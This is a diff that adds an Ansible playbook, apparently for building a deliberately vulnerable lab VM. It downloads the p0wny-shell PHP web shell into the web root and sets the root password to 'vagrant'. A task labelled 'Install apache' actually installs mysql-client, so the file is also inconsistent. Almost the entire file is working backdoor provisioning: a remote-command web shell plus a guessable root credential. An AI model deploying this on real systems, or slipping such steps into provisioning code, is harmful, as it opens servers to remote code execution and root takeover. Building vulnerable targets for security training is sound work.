@@ -1,0 +1,29 @@
+---
+- name: Provision VM with apache and webshell
+  become: true  # If you need to run tasks with elevated privileges, such as sudo
+  hosts: all
+  gather_facts: true
+
+  tasks:
+    - name: Install apache
+      ansible.builtin.apt:
+        #update_cache: true
+        name: mysql-client
+        state: present
+    # - name: Install mysql
+    #   ansible.builin.apt:
+    #     name: "mysql-server"
+    #     state: present
+    # - name: Start apache service
+    #   ansible.builtin.service:
+    #     name: apache2
+    #     state: started
+    - name: Install php webshell
+      ansible.builtin.get_url:
+        url: https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php
+        dest: "/var/www/html/website"
+        mode: '0644'
+    - name: Set username and password
+      ansible.builtin.user:
+        name: "root"
+        password: "{{ 'vagrant' | password_hash('sha512') }}"
